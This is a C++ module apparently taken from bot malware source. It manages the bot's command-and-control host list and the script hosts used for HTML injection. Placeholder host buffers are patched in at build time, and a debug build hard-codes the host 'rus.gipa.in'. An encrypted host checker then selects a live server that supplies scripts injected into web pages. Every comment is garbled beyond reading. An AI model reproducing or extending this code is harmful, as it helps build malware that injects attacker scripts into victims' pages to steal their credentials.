//---------------------------------------------------------------------------
#pragma hdrstop



#include "Modules.h"


#ifdef AzConfigH
	//****************************************
	//   ���� ������� � ������ �������
	//   ���������� ��������� ���������
	//****************************************
	#define USE_AZ_CONFIG
#else

    #include "AzConfig.h"

#endif


#include "Strings.h"
#include "Config.h"
#include "Utils.h"
#include "BotHosts.h"
//-----------------------------------------------------------------------------


// ���������� ������ ������
namespace AZDATA
{
	DWORD PID = 0; // ������������ �������� � ������� �������� ������
    THostChecker *Checker = NULL; // ������� �������� ����������������� ������
}



#ifdef USE_AZ_CONFIG

	char AZ_HOSTS[AZ_HOSTS_SIZE] = "__AZ_HOSTS__\0\0";

	#define AZ_HOSTS_HASH 0xE0203A42 /* __AZ_HOSTS__ */

#endif


//*****************************************************************
//  �����, ������� ����� ��������� � HTML �������
//*****************************************************************
#ifdef DEBUGCONFIG
    // ���������� ������
	char AZ_SCRIPTS_HOSTS[] = "rus.gipa.in\0\0";
#else
	// ������� ������
	char AZ_SCRIPTS_HOSTS[AZ_SCRIPTS_HOSTS_SIZE] = "__AZ_SCRIPTS_HOSTS__\0\0";
#endif

#define AZ_SCRIPTS_HOSTS_HASH 0x94D84D31 /* __AZ_SCRIPTS_HOSTS__ */



//----------------------------------------------------
// GetAzHost - ������� ���������� ������ ������� ����
// �� ������� ������ ������� AZ
//----------------------------------------------------
string GetAzHost()
{
	#ifdef USE_AZ_CONFIG
		return GetActiveHostFromBuf2(AZ_HOSTS, AZ_HOSTS_HASH, true);
	#else
    	return GetActiveHost2();
	#endif
}
//-----------------------------------------------------------------------------


//----------------------------------------------------
//  GetAzURL - ������� ���������� ������ ����� ��
//   ������ ����� ������� � ����������� ����
//----------------------------------------------------
string GetAzURL(const char*  Path)
{
	string Host = GetAzHost();
	if (Host.IsEmpty()) return Host;
	TURL URL;
	URL.Host = Host;
	URL.Path = Path;

    return URL.URL();
}
//-----------------------------------------------------------------------------

//----------------------------------------------------
//  AzInicializeHostChecker - ������� ��������������
//  ������� �������� ������
//----------------------------------------------------
void AzInicializeHostChecker()
{
	if (IsNewProcess(AZDATA::PID))
	{
		// ������ � ����� ��������
		#ifdef DEBUGCONFIG
        	bool Encrypted = false;
		#else
        	bool Encrypted = true;
		#endif
		AZDATA::Checker = new THostChecker(AZ_SCRIPTS_HOSTS, Encrypted);
    }
}
//-----------------------------------------------------------------------------


//----------------------------------------------------
//  AzInizializeHTMLInjects  - ������� ��������������
//  ������� ������� ������ � HTML ��������
//----------------------------------------------------
void AzInizializeHTMLInjects(const THTMLInjectList &Injects)
{
	// ���������� ������� � ���� � ��� ��������� ���������

	int Count = Injects.Count();
	for (int i = 0; i < Count; i++)
	{
        THTMLInject *Inject = Injects[i];
	}
}
//-----------------------------------------------------------------------------



//----------------------------------------------------
// AzCheckScriptHosts - ������� ��������� ��������
// ������ ��������� � HTML �������
//----------------------------------------------------
void AzCheckScriptHosts()
{
	// �������������� ��������
	AzInicializeHostChecker();

    AZDATA::Checker->Check();
}
//-----------------------------------------------------------------------------


//----------------------------------------------------
// AzGetScriptHost - ������� ����������  ������� ����
// ��� ������ � HTML �������
//----------------------------------------------------
string AzGetScriptHost()
{
	if (AnsiStr::Hash(AZ_SCRIPTS_HOSTS) == AZ_SCRIPTS_HOSTS_HASH)
		return NULLSTR;

	// �������������� ����� ������
	AzInicializeHostChecker();

	// ����������� ������� ����
	return AZDATA::Checker->GetWorkHost();

}
//-----------------------------------------------------------------------------
